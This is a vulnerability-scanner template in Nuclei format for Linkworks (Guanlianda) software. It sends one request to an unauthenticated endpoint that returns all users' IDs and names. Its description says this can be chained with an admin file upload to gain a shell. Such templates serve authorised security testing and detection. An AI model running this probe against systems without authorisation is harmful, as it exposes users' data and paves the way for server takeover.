id: guanlianda-service-getuserxml-info-2
info:
  name: guanlianda-service-getuserxml-info-2
  author: apple
  severity: high
  description: guanlianda-service-getuserxml-info ，可配合后台文件上传进行 getshell
  reference:
    - https://https://mp.weixin.qq.com/s/5p8ecSeJbiNnWFlMn6218A
  tags: Linkworks
http:
  - raw:
      - |+
        GET //Org/service/Service.asmx/GetAllUsersXml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - UserId
      - type: word
        part: body
        words:
          - Name
